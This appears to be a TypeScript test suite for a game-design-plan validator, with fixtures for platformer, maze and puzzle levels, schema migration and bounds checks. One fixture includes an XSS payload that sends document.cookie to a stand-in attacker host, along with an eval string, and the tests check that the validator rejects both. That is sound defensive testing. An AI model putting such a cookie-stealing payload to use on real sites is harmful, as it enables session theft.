import assert from 'node:assert';
import type { GameDesignPlan } from '../src/types/plan.js';
import {
  validateGamePlan,
  assertValidGamePlan,
  migrateGamePlan,
  PlanValidationError,
} from '../src/utils/planValidator.js';
import { checkTemplateCompatibility } from '../src/templates/templateRegistry.js';
import { buildGameGenerationPlan } from '../server/services/referenceAnalysis.service.js';
import { convertPlanToPlayableScene } from '../src/game/sceneConverter.js';
import { ReferenceAnalysisSchema } from '../src/types/reference.js';

console.log('🧪 Starting Draw2Play AI Stage 2: Structured Game-Plan Intelligence Test Suite...\n');

// ===========================================================================
// FIXTURE 1: Multilevel Platform Scene
// ===========================================================================
console.log('▶ Fixture 1: Multilevel Platform Scene');

const multilevelPlan: GameDesignPlan = {
  schemaVersion: '2.0',
  generationId: 'gen-multilevel-001',
  id: 'plan-multilevel-001',
  referenceId: 'ref-multilevel-art',
  title: 'Vertical Ascent Tower',
  description: 'A 4-tier vertical jumping trial with moving hazards and coin clusters.',
  sourceType: 'image-upload',
  provenance: 'gemini-vision',
  provider: {
    id: 'gemini',
    model: 'gemini-2.5-flash',
    isFallback: false,
  },
  templateId: 'phaser-2d-platformer',
  targetEngine: 'phaser-2d',
  category: '2d-platformer',
  userPrompt: 'Create a 4-tier platformer jumping level',
  theme: {
    name: 'forest',
    palette: ['#10b981', '#047857', '#38bdf8', '#facc15', '#ef4444'],
    background: '#070a13',
  },
  world: {
    width: 1200,
    height: 800,
    gravity: 800,
    coordinateSystem: 'screen-top-left-2d',
    friction: 0.8,
  },
  terrain: {
    platforms: [
      // Base ground tier
      { id: 'plat-t1-base', x: 0, y: 760, width: 1200, height: 40, strokeColor: '#10b981' },
      // Tier 2
      { id: 'plat-t2-left', x: 80, y: 590, width: 280, height: 20, strokeColor: '#38bdf8' },
      { id: 'plat-t2-right', x: 650, y: 590, width: 340, height: 20, strokeColor: '#38bdf8' },
      // Tier 3
      { id: 'plat-t3-mid', x: 380, y: 420, width: 440, height: 20, strokeColor: '#38bdf8' },
      // Tier 4 (Peak)
      { id: 'plat-t4-goal', x: 850, y: 250, width: 260, height: 20, strokeColor: '#facc15' },
    ],
    walls: [
      { id: 'wall-left-bound', x: 0, y: 0, width: 20, height: 800, strokeColor: '#047857' },
      { id: 'wall-right-bound', x: 1180, y: 0, width: 20, height: 800, strokeColor: '#047857' },
    ],
    hazards: [
      { id: 'hazard-pit-1', x: 420, y: 740, width: 80, height: 20, hazardType: 'spike' },
    ],
  },
  player: {
    spawn: { x: 80, y: 700 },
    speed: 260,
    jumpPower: 480,
    size: 36,
    supportedAbilities: ['walk', 'run', 'jump', 'double_jump'],
  },
  entities: {
    enemies: [
      { id: 'enemy-t2-patrol', name: 'Slime Sentry', type: 'patrol', x: 720, y: 560, patrolDistance: 120, damage: 1 },
    ],
    collectibles: [
      { id: 'coin-t2-1', name: 'Gold Coin', type: 'coin', x: 180, y: 550, value: 10 },
      { id: 'coin-t3-1', name: 'Sky Gem', type: 'gem', x: 600, y: 380, value: 50 },
    ],
    interactives: [
      { id: 'bounce-t1-to-t2', type: 'trampoline', x: 480, y: 740 },
    ],
  },
  objectives: {
    primary: {
      type: 'reach_goal',
      targetRef: 'goal-portal-peak',
    },
    winConditions: ['Reach the peak goal portal', 'Collect optional treasures'],
    loseConditions: ['Fall into lethal spikes', 'Deplete health against patrolling enemies'],
    checkpoints: [{ id: 'cp-tier-2', x: 680, y: 560 }],
    goal: { id: 'goal-portal-peak', x: 1000, y: 200, width: 36, height: 48 },
  },
  difficulty: {
    tier: 'medium',
    seed: 101,
    enemySpeedMultiplier: 1.0,
  },
  mechanics: {
    allowedMechanics: ['jump_and_run', 'hazard_evasion', 'coin_collection', 'trampoline_bounce', 'patrol_enemy_avoidance'],
    rejectedMechanics: [],
  },
  confidenceAndWarnings: {
    overallConfidence: 'high',
    confidenceReasoning: 'Distinct horizontal platforms visible across 4 vertical tiers in source image.',
    warnings: [],
    unsupportedFeatures: [],
  },
  status: 'ready-for-2d-generation',
  createdAt: '2026-10-11T12:00:00.000Z',
  requestedFeatures: [],
  missingRequirements: [],
  limitationsAndWarnings: [],
};

const v1Result = validateGamePlan(multilevelPlan);
assert.strictEqual(v1Result.success, true, 'Multilevel platform plan must pass validation');
assert.strictEqual(v1Result.errors.length, 0);

const v1Compat = checkTemplateCompatibility(multilevelPlan);
assert.strictEqual(v1Compat.isCompatible, true, 'Multilevel plan must be compatible with phaser-2d-platformer');

const v1Scene = convertPlanToPlayableScene(multilevelPlan);
assert.strictEqual(v1Scene.platforms.length, 7); // 5 platforms + 2 walls
assert.strictEqual(v1Scene.hazards.length, 1);
assert.strictEqual(v1Scene.trampolines.length, 1);
assert.strictEqual(v1Scene.coins.length, 2);
assert.strictEqual(v1Scene.world.gravity, 800);
console.log('  ✓ Multilevel platform scene validated and successfully converted to playable Phaser scene');

// ===========================================================================
// FIXTURE 2: Top-Down Maze
// ===========================================================================
console.log('\n▶ Fixture 2: Top-Down Maze');

const topdownMazePlan: GameDesignPlan = {
  schemaVersion: '2.0',
  generationId: 'gen-maze-002',
  id: 'plan-maze-002',
  referenceId: 'ref-dungeon-sketch',
  title: 'Crypt of Shadows',
  description: 'Top-down labyrinth with perimeter walls, keys, and zero gravity.',
  sourceType: 'image-upload',
  provenance: 'gemini-vision',
  provider: {
    id: 'gemini',
    model: 'gemini-2.5-flash',
    isFallback: false,
  },
  templateId: 'phaser-2d-topdown',
  targetEngine: 'phaser-2d',
  category: 'top-down-2d',
  userPrompt: 'Create a top-down dungeon maze with keys and doors',
  theme: {
    name: 'ice',
    palette: ['#38bdf8', '#0284c7', '#94a3b8', '#f8fafc'],
    background: '#070a13',
  },
  world: {
    width: 900,
    height: 900,
    gravity: 0, // Must be 0 for topdown
    coordinateSystem: 'screen-top-left-2d',
    friction: 0.8,
  },
  terrain: {
    platforms: [],
    walls: [
      { id: 'wall-perimeter-n', x: 0, y: 0, width: 900, height: 30 },
      { id: 'wall-perimeter-s', x: 0, y: 870, width: 900, height: 30 },
      { id: 'wall-perimeter-w', x: 0, y: 0, width: 30, height: 900 },
      { id: 'wall-perimeter-e', x: 870, y: 0, width: 30, height: 900 },
      { id: 'wall-corridor-1', x: 250, y: 150, width: 30, height: 500 },
      { id: 'wall-corridor-2', x: 550, y: 250, width: 30, height: 500 },
    ],
    hazards: [
      { id: 'hazard-lava-floor', x: 350, y: 400, width: 120, height: 120, hazardType: 'lava' },
    ],
  },
  player: {
    spawn: { x: 80, y: 100 },
    speed: 200,
    jumpPower: 0,
    size: 32,
    supportedAbilities: ['walk', 'run', 'dash'],
  },
  entities: {
    enemies: [
      { id: 'enemy-patrol-sentry', name: 'Crypt Keeper', type: 'patrol', x: 420, y: 200, patrolDistance: 150, damage: 1 },
    ],
    collectibles: [
      { id: 'key-item-1', name: 'Iron Key', type: 'key', x: 120, y: 700, value: 1 },
    ],
    interactives: [
      { id: 'door-chamber', type: 'door', x: 550, y: 180, targetRef: 'key-item-1' },
    ],
  },
  objectives: {
    primary: {
      type: 'reach_goal',
      targetRef: 'maze-exit-door',
    },
    winConditions: ['Retrieve the Iron Key and reach the exit door'],
    loseConditions: ['Touch molten lava or patrol guardians'],
    checkpoints: [],
    goal: { id: 'maze-exit-door', x: 800, y: 800, width: 40, height: 40 },
  },
  difficulty: {
    tier: 'hard',
    seed: 555,
    enemySpeedMultiplier: 1.2,
  },
  mechanics: {
    allowedMechanics: ['topdown_4way_movement', 'door_key_unlock', 'hazard_evasion', 'patrol_enemy_avoidance'],
    rejectedMechanics: [],
  },
  confidenceAndWarnings: {
    overallConfidence: 'high',
    confidenceReasoning: 'Top-down dungeon corridor network cleanly detected.',
    warnings: [],
    unsupportedFeatures: [],
  },
  status: 'ready-for-2d-generation',
  createdAt: '2026-10-11T12:00:00.000Z',
  requestedFeatures: [],
  missingRequirements: [],
  limitationsAndWarnings: [],
};

const v2Result = validateGamePlan(topdownMazePlan);
assert.strictEqual(v2Result.success, true, 'Top-down maze plan must be valid');

const v2Compat = checkTemplateCompatibility(topdownMazePlan, 'phaser-2d-topdown');
assert.strictEqual(v2Compat.isCompatible, true, 'Must be compatible with phaser-2d-topdown');

// Check incompatibility if gravity > 0 is configured in top-down
const badGravityMaze = { ...topdownMazePlan, world: { ...topdownMazePlan.world, gravity: 500 } };
const badGravityCompat = checkTemplateCompatibility(badGravityMaze, 'phaser-2d-topdown');
assert.strictEqual(badGravityCompat.isCompatible, false, 'Top-down template must reject positive gravity');
assert.ok(badGravityCompat.errors.some((e) => e.includes('zero gravity')), 'Must explain gravity constraint');
assert.ok(badGravityCompat.suggestedAlternatives.length > 0, 'Must offer supported alternatives');
assert.strictEqual(badGravityCompat.suggestedAlternatives[0].templateId, 'phaser-2d-platformer');
console.log('  ✓ Top-down maze verified, zero-gravity enforced, and template alternatives offered on mismatch');

// ===========================================================================
// FIXTURE 3: Puzzle Room
// ===========================================================================
console.log('\n▶ Fixture 3: Puzzle Room');

const puzzleRoomPlan: GameDesignPlan = {
  schemaVersion: '2.0',
  generationId: 'gen-puzzle-003',
  id: 'plan-puzzle-003',
  referenceId: 'ref-puzzle-chamber',
  title: 'Chamber of Switches',
  description: 'Interactive puzzle chamber with mechanical switches and locked vault doors.',
  sourceType: 'image-upload',
  provenance: 'mock-heuristic',
  provider: {
    id: 'local-heuristic',
    model: 'deterministic-keywords-v2',
    isFallback: true,
  },
  templateId: 'phaser-2d-puzzle',
  targetEngine: 'phaser-2d',
  category: 'puzzle',
  userPrompt: 'Create a puzzle room with toggles and gates',
  theme: {
    name: 'cyberpunk',
    palette: ['#a855f7', '#06b6d4', '#f43f5e', '#1e293b'],
    background: '#070a13',
  },
  world: {
    width: 800,
    height: 600,
    gravity: 600,
    coordinateSystem: 'screen-top-left-2d',
    friction: 0.8,
  },
  terrain: {
    platforms: [
      { id: 'puzzle-floor', x: 0, y: 560, width: 800, height: 40, strokeColor: '#a855f7' },
      { id: 'puzzle-ledge-1', x: 100, y: 400, width: 220, height: 20, strokeColor: '#06b6d4' },
      { id: 'puzzle-ledge-2', x: 480, y: 320, width: 220, height: 20, strokeColor: '#06b6d4' },
    ],
    walls: [
      { id: 'puzzle-wall-w', x: 0, y: 0, width: 20, height: 600 },
      { id: 'puzzle-wall-e', x: 780, y: 0, width: 20, height: 600 },
    ],
    hazards: [],
  },
  player: {
    spawn: { x: 80, y: 500 },
    speed: 220,
    jumpPower: 450,
    size: 36,
    supportedAbilities: ['walk', 'run', 'jump'],
  },
  entities: {
    enemies: [],
    collectibles: [
      { id: 'vault-key', name: 'Security Keycard', type: 'key', x: 180, y: 360, value: 1 },
    ],
    interactives: [
      { id: 'switch-a', type: 'switch', x: 550, y: 280, targetRef: 'vault-door' },
      { id: 'vault-door', type: 'door', x: 700, y: 480, targetRef: 'vault-key' },
    ],
  },
  objectives: {
    primary: {
      type: 'reach_goal',
      targetRef: 'puzzle-goal-portal',
    },
    winConditions: ['Activate Switch A, unlock Vault Door, and exit chamber'],
    loseConditions: ['Exceed allowed timer'],
    checkpoints: [],
    goal: { id: 'puzzle-goal-portal', x: 730, y: 500, width: 36, height: 48 },
  },
  difficulty: {
    tier: 'medium',
    seed: 777,
    enemySpeedMultiplier: 1.0,
  },
  mechanics: {
    allowedMechanics: ['switch_toggle', 'door_key_unlock', 'jump_and_run', 'coin_collection'],
    rejectedMechanics: [],
  },
  confidenceAndWarnings: {
    overallConfidence: 'medium',
    confidenceReasoning: 'Interactive elements hypothesized from chamber layout.',
    warnings: [],
    unsupportedFeatures: [],
  },
  status: 'ready-for-2d-generation',
  createdAt: '2026-10-11T12:00:00.000Z',
  requestedFeatures: [],
  missingRequirements: [],
  limitationsAndWarnings: [],
};

const v3Result = validateGamePlan(puzzleRoomPlan);
assert.strictEqual(v3Result.success, true, 'Puzzle room plan must be valid');

const v3Compat = checkTemplateCompatibility(puzzleRoomPlan);
assert.strictEqual(v3Compat.isCompatible, true, 'Puzzle room plan must be compatible with phaser-2d-puzzle');
console.log('  ✓ Puzzle room validated with verified switch and door cross-references');

// ===========================================================================
// FIXTURE 4: Image with Ambiguous or Occluded Objects
// ===========================================================================
console.log('\n▶ Fixture 4: Ambiguous / Occluded Reference Analysis');

const occludedAnalysis = {
  schemaVersion: '2.0',
  category: '2d-platformer' as const,
  cameraPerspective: 'side-scrolling-2d' as const,
  visualStyle: 'Blurry Hand-Drawn Doodle',
  colorPalette: ['#1e293b', '#64748b'],
  visibleObjects: ['Unclear horizontal smudge', 'Indistinct marker dot'],
  terrainLayout: 'Ambiguous dark strokes with high visual occlusion.',
  suggestedRoles: {
    player: 'Indistinct marker dot',
    obstacles: ['Smudge blob'],
    collectibles: [],
    goals: [],
  },
  inferredMechanics: [
    {
      name: 'Jump and Run (Speculative)',
      description: 'Hypothesis: Platform navigation inferred purely from standard horizontal line doodle.',
      confidence: 0.35, // Calibrated low confidence
      observationalEvidence: ['Smudge line roughly horizontal at canvas base'],
      supportingObservations: ['Minimal contrast'],
    },
  ],
  observedEvidence: {
    majorShapesAndBoundaries: ['Horizontal bottom stroke with ragged edges'],
    platformsAndFloors: ['Unconfirmed platform smudge'],
    wallsAndCorridors: [],
    visibleCharactersAndObjects: ['Marker dot'],
    visibleHazards: [],
    visibleCollectibles: [],
    relativeSpatialLayout: 'Dot positioned above bottom line smudge.',
    dominantColors: ['#1e293b'],
    visualStyle: 'Hand-drawn marker sketch with motion blur',
    uncertainAndOccludedRegions: [
      'Heavy blur obscures object identities',
      'Cannot verify whether smudge is platform, decoration, or background artifact',
      'Physics, gravity, and game rules cannot be confirmed from static blur',
    ],
  },
  proposedDesign: {
    suggestedGenre: '2d-platformer' as const,
    cameraPerspective: 'side-scrolling-2d' as const,
    playerAbilitiesAndMovement: {
      movementType: '2D Run and Jump',
      abilities: ['walk', 'run', 'jump'],
    },
    coreGameplayLoop: 'Traverse platform lines, reach goal flag.',
    objectivesAndConditions: {
      primaryObjective: 'Reach the exit flag',
      winConditions: ['Reach the goal'],
      loseConditions: ['Fall below screen'],
    },
    proposedEnemiesAndHazards: [],
    proposedCollectibles: [],
    difficultyProgression: { tier: 'easy' as const, pacingNotes: 'Basic trial' },
    audioVisualFeedback: { visualStyleCues: ['Marker doodle'], suggestedAudioMood: 'Calm ambient' },
    inferredMechanics: [],
  },
  uncertaintiesAndWarnings: [
    'Image quality is low with heavy occlusion.',
    'Model confidence is calibrated to LOW; manual review required.',
  ],
  recommendedPipeline: 'phaser-2d' as const,
  provenance: 'mock-heuristic' as const,
  analyzedAt: '2026-10-11T12:00:00.000Z',
  analysisConfidenceTier: 'low' as const,
  frameCount: 1,
};

const parsedOccluded = ReferenceAnalysisSchema.parse(occludedAnalysis);
assert.strictEqual(parsedOccluded.analysisConfidenceTier, 'low');
assert.ok(parsedOccluded.observedEvidence !== undefined);
assert.ok(parsedOccluded.observedEvidence.uncertainAndOccludedRegions.length >= 2);
assert.ok(parsedOccluded.inferredMechanics[0].confidence < 0.5);

// Build plan from occluded analysis: must succeed safely with normalized bounds & warnings
const occludedPlan = buildGameGenerationPlan('ref-occluded', 'Make a game from this doodle', parsedOccluded);
assert.strictEqual(occludedPlan.confidenceAndWarnings.overallConfidence, 'low');
assert.ok(occludedPlan.confidenceAndWarnings.warnings.some((w) => w.toLowerCase().includes('low')));
console.log('  ✓ Ambiguous/occluded image correctly grounds low confidence and records uncertain regions');

// ===========================================================================
// FIXTURE 5: Malformed AI Output (Security & Non-Finite Numbers)
// ===========================================================================
console.log('\n▶ Fixture 5: Malformed AI Output (Security & Type Violations)');

// 5A: NaN and Infinity
const nonFinitePlan = {
  ...multilevelPlan,
  world: {
    ...multilevelPlan.world,
    width: Number.NaN,
  },
};
const resNonFinite = validateGamePlan(nonFinitePlan);
assert.strictEqual(resNonFinite.success, false, 'Plan with NaN must fail validation');

// 5B: Code injection attack attempt
const maliciousScriptPlan = {
  ...multilevelPlan,
  description: '<script>window.location="http://attacker.com?steal="+document.cookie</script>',
};
const resScript = validateGamePlan(maliciousScriptPlan);
assert.strictEqual(resScript.success, false, 'Executable script tag must trigger security violation');
assert.ok(resScript.errors.some((e) => e.includes('Security violation')), 'Must report security violation');

const maliciousEvalPlan = {
  ...multilevelPlan,
  title: 'Eval Game eval("process.exit(1)")',
};
const resEval = validateGamePlan(maliciousEvalPlan);
assert.strictEqual(resEval.success, false, 'Dynamic eval() call must trigger security violation');
assert.ok(resEval.errors.some((e) => e.includes('Security violation')));

// 5C: assertValidGamePlan throws PlanValidationError
assert.throws(
  () => assertValidGamePlan(maliciousScriptPlan),
  PlanValidationError,
  'assertValidGamePlan must throw PlanValidationError on security violation'
);
console.log('  ✓ Malformed non-finite values and malicious script/eval injections strictly rejected');

// ===========================================================================
// FIXTURE 6: Unsupported Mechanics
// ===========================================================================
console.log('\n▶ Fixture 6: Unsupported Mechanics Rejection');

const rogueMechanicsPlan = {
  ...multilevelPlan,
  mechanics: {
    allowedMechanics: [
      'jump_and_run',
      'unsupported_teleport_glitch' as any,
      'infinite_gold_generator' as any,
    ],
    rejectedMechanics: [],
  },
};

const resRogue = validateGamePlan(rogueMechanicsPlan);
assert.strictEqual(resRogue.success, false, 'Unauthorized mechanics outside allowlist must be rejected');
assert.ok(
  resRogue.errors.some(
    (e) =>
      e.includes('mechanics.allowedMechanics') ||
      e.includes('unsupported_teleport_glitch') ||
      e.includes('Invalid enum value') ||
      e.includes('Invalid option')
  ),
  'Must report invalid mechanic'
);
console.log('  ✓ Non-allowlisted mechanics safely rejected before runtime ingestion');

// ===========================================================================
// FIXTURE 7: Old Schema Versions & Migration
// ===========================================================================
console.log('\n▶ Fixture 7: Legacy Schema Migration (v1.0 -> v2.0)');

const legacyV1Plan = {
  id: 'plan-legacy-2025',
  referenceId: 'ref-legacy-screenshot',
  userPrompt: 'Retro 8-bit platformer jump adventure',
  targetEngine: 'phaser-2d' as const,
  category: '2d-platformer' as const,
  requestedFeatures: ['Platform Run', 'Spike Evasion', 'Coin Grab'],
  missingRequirements: [],
  limitationsAndWarnings: ['Generated with legacy v1.0 pipeline'],
  status: 'ready-for-2d-generation' as const,
  createdAt: '2025-10-01T10:00:00.000Z',
  suggested2DConfig: {
    theme: 'forest' as const,
    playerSpeed: 250,
    playerJump: 460,
    gravity: 750,
    platformCount: 5,
    hazardTypes: ['spike'],
    collectibleTypes: ['coin'],
  },
};

const migratedV2 = migrateGamePlan(legacyV1Plan);
assert.strictEqual(migratedV2.schemaVersion, '2.0', 'Migrated plan must declare schemaVersion 2.0');
assert.strictEqual(migratedV2.templateId, 'phaser-2d-platformer');
assert.strictEqual(migratedV2.player.speed, 250);
assert.strictEqual(migratedV2.player.jumpPower, 460);
assert.ok(migratedV2.terrain.platforms.length >= 5, 'Migrated plan must synthesize stepping stone platforms');
assert.ok(migratedV2.entities.collectibles.length >= 3, 'Migrated plan must preserve collectibles');
assert.strictEqual(migratedV2.objectives.primary.type, 'reach_goal');
assert.ok(migratedV2.objectives.primary.targetRef !== undefined);

// Ensure migrated plan converts seamlessly to PlayableGameScene
const migratedScene = convertPlanToPlayableScene(migratedV2);
assert.strictEqual(migratedScene.schemaVersion, '1.0');
assert.ok(migratedScene.platforms.length >= 5);
assert.ok(migratedScene.coins.length >= 3);
assert.strictEqual(migratedScene.player.speed, 250);
console.log('  ✓ Legacy v1.0 plans migrated without data loss and converted to playable Phaser scene');

// ===========================================================================
// FIXTURE 8: Out-of-Bounds Geometry
// ===========================================================================
console.log('\n▶ Fixture 8: Out-of-Bounds Geometry');

// Platform extending beyond world bounds (x + width > worldWidth)
const outOfBoundsPlatformPlan = {
  ...multilevelPlan,
  terrain: {
    ...multilevelPlan.terrain,
    platforms: [
      ...multilevelPlan.terrain.platforms,
      { id: 'plat-outside', x: 1100, y: 500, width: 250, height: 20 }, // 1100 + 250 = 1350 > 1200
    ],
  },
};

const resOOBPlat = validateGamePlan(outOfBoundsPlatformPlan);
assert.strictEqual(resOOBPlat.success, false, 'Platform exceeding world width must fail');
assert.ok(resOOBPlat.errors.some((e) => e.includes('horizontal span') || e.includes('exceeds world width')));

// Spawn point outside world bounds
const outOfBoundsSpawnPlan = {
  ...multilevelPlan,
  player: {
    ...multilevelPlan.player,
    spawn: { x: -50, y: 400 }, // Negative X
  },
};
const resOOBSpawn = validateGamePlan(outOfBoundsSpawnPlan);
assert.strictEqual(resOOBSpawn.success, false, 'Negative spawn coordinate must fail');
assert.ok(resOOBSpawn.errors.some((e) => e.includes('Player spawn X')));
console.log('  ✓ Out-of-bounds platforms and negative spawn coordinates cleanly detected');

// ===========================================================================
// FIXTURE 9: Excessive Entity Counts
// ===========================================================================
console.log('\n▶ Fixture 9: Excessive Entity Counts Enforcement');

// Generate 160 platforms (max allowed: 150)
const excessivePlatforms = Array.from({ length: 160 }, (_, i) => ({
  id: `plat-overflow-${i}`,
  x: (i * 5) % 1000,
  y: (i * 4) % 700,
  width: 50,
  height: 15,
}));

const excessivePlan = {
  ...multilevelPlan,
  terrain: {
    ...multilevelPlan.terrain,
    platforms: excessivePlatforms,
  },
};

const resExcessive = validateGamePlan(excessivePlan);
assert.strictEqual(resExcessive.success, false, 'Excessive platform count (>150) must fail');
assert.ok(
  resExcessive.errors.some((e) => e.includes('terrain.platforms') || e.includes('Too many items')),
  'Must report excessive platform count'
);
console.log('  ✓ Entity bounds (max 150 platforms, 50 enemies) strictly enforced');

// ===========================================================================
// FIXTURE 10: Invalid Objective & Entity References
// ===========================================================================
console.log('\n▶ Fixture 10: Invalid Objective & Broken Entity References');

// 10A: Primary objective references non-existent goal ID
const brokenObjectivePlan = {
  ...multilevelPlan,
  objectives: {
    ...multilevelPlan.objectives,
    primary: {
      type: 'reach_goal' as const,
      targetRef: 'non-existent-phantom-portal', // Does not exist
    },
  },
};

const resBrokenObj = validateGamePlan(brokenObjectivePlan);
assert.strictEqual(resBrokenObj.success, false, 'Dangling targetRef in primary objective must fail');
assert.ok(
  resBrokenObj.errors.some((e) => e.includes('non-existent target ID "non-existent-phantom-portal"')),
  'Must report missing objective target reference'
);

// 10B: Duplicate entity IDs across collections
const duplicateIdPlan = {
  ...multilevelPlan,
  terrain: {
    ...multilevelPlan.terrain,
    hazards: [
      { id: 'plat-t1-base', x: 200, y: 740, width: 40, height: 20, hazardType: 'spike' as const }, // Conflicted with platform ID
    ],
  },
};

const resDup = validateGamePlan(duplicateIdPlan);
assert.strictEqual(resDup.success, false, 'Duplicate entity ID must fail validation');
assert.ok(resDup.errors.some((e) => e.includes('Duplicate entity ID detected')), 'Must report duplicate entity ID');

console.log('  ✓ Broken entity references and duplicate entity IDs caught and rejected');

console.log('\n🎉 ALL 10 STAGE 2 GAME-PLAN INTELLIGENCE FIXTURES AND INTEGRATION TESTS PASSED!\n');


// ===========================================================================
// BASELINE REGRESSION: Plan-to-runtime scaling, enemy semantics, provenance
// ===========================================================================
console.log('\n▶ Baseline regression: resized plan conversion and provenance');

const resizedRegressionPlan: GameDesignPlan = {
  ...multilevelPlan,
  provenance: 'mock-heuristic',
  entities: {
    ...multilevelPlan.entities,
    enemies: [
      {
        id: 'enemy-jumper-regression',
        name: 'Jumper Regression',
        type: 'jumper',
        x: 600,
        y: 400,
        patrolDistance: 120,
        damage: 1,
      },
    ],
  },
};

const resizedRegressionScene = convertPlanToPlayableScene(resizedRegressionPlan, {
  worldWidth: 600,
  worldHeight: 400,
});

const scaledPlatform = resizedRegressionScene.platforms.find((p) => p.id === 'plat-t2-left');
assert.ok(scaledPlatform, 'Expected source platform to survive conversion');
assert.deepStrictEqual(
  [scaledPlatform.x, scaledPlatform.y, scaledPlatform.width, scaledPlatform.height],
  [40, 295, 140, 10],
  'Platform position and dimensions must scale with the target world'
);
assert.deepStrictEqual(
  [resizedRegressionScene.player.spawnX, resizedRegressionScene.player.spawnY],
  [40, 350],
  'Player spawn must scale with the target world'
);
assert.deepStrictEqual(
  [resizedRegressionScene.goal.x, resizedRegressionScene.goal.y, resizedRegressionScene.goal.width, resizedRegressionScene.goal.height],
  [500, 100, 18, 24],
  'Goal position and dimensions must scale with the target world'
);
assert.strictEqual(
  resizedRegressionScene.source,
  'mock-fallback',
  'Keyword heuristic provenance must not be mislabeled as local-vector'
);
assert.strictEqual(
  resizedRegressionScene.enemies[0]?.type,
  'chaser',
  'A jumper enemy must retain active behavior instead of silently becoming a patrol'
);
console.log('  ✓ World scaling, player spawn, goal dimensions, enemy behavior, and heuristic provenance preserved');
